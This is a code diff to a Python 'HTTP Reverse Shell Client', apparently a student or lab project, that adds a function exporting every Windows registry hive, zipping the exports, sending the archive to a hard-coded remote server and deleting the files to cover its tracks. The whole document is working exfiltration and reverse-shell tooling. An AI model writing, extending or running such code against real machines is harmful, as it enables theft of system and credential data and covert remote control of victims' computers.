@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 
+from zipfile import ZipFile
 import http.client
 import subprocess
 import time
 import requests
 import os
-IP = 'http://' + '172.19.66.82' + ':8088'
+import shutil
+
+IP = 'http://' + '172.19.131.58' + ':8088'
 
 """
 Authors: Jordan Sosnowski and John Osho
@@ -16,10 +19,28 @@ HTTP Reverse Shell Client
 
 
 def pull_registry():
-    reg_cmd = ''    # single line command to export reg keys, zip the files, delete the files
-    exp_cmd = '^ file_path'  # path to zip file containing reg keys, start with `^ `
-    run_process(reg_cmd)
+    regKeys = ['HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER',
+               'HKEY_LOCAL_MACHINE', 'HKEY_USERS', 'HKEY_CURRENT_CONFIG']
+
+    fileNamespathList = []
+    for key in regKeys:
+        fname = f"bkReg_{key}.reg"
+        fileNamespathList.append(fname)
+        filenamepath = f"{fname}"
+        regkk = 'reg export' + " " + key + " " + filenamepath
+        os.system(regkk)
+
+    with ZipFile('my_python_files.zip', 'w') as zip:
+        # writing each file one by one
+        for file in fileNamespathList:
+            zip.write(file)
+            os.remove(file)
+
+    # path to zip file containing reg keys, start with `^ `
+    exp_cmd = '^ ./my_python_files.zip'
     send_file(exp_cmd)
+
+    os.remove('./my_python_files.zip')
 
 
 def send_file(command):
